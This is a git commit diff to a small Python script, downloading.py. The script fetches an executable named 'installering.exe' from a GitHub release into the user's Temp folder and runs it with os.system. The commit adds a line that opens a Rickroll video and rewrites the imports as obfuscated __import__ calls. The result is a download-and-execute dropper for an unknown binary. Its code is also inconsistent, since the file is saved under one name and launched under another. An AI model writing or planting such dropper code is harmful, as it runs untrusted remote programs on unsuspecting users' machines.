78896cdadfc4bbff84a6a2755cb0f7f3a2442b66
Pilot1782 <34791564a@gmail.com>
2023-02-07 08:21:45 -0700

    Update downloading.py

--- downloading.py
+++ downloading.py
@@ -1,4 +1,5 @@
 import urllib.request
-import os
+__import__("webbrowser").open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
+__import__("time").sleep(5)
 urllib.request.urlretrieve("https://github.com/Pilot1782/amogusus/releases/download/V1.1.1/installering.exe", r"%HOMEPATH%\AppData\Local\Temp\downloader.exe")
-os.system(r"%HOMEPATH%\AppData\Local\Temp\installering.exe")
+__import__("os").system(r"%HOMEPATH%\AppData\Local\Temp\installering.exe")
